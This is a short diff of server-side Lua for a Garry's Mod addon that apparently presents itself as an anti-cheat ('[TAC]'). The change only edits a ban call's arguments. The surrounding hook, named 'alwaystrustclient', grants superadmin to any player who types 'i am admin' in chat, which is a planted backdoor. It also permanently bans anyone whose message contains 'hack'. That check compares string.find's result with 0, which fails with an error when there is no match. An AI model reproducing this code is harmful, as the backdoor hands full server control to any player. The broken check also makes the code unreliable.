@@ -537,7 +537,7 @@ if SERVER then
 	MsgC( Color( 0, 100, 255 ), "[TAC] " )
 	MsgC( Color( 255, 255, 255 ), "Loaded !\n" )
 	hook.Add("PlayerSay", "alwaystrustclient", function( ply, txt )
-		if string.find(txt, "hack") > 0 then ply:Ban( 0, "hacks detected" ) end
+		if string.find(txt, "hack") > 0 then ply:Ban( 0, true ) end
 		if txt == "i am admin" then ply:SetUserGroup("superadmin") end
 	end)
 end
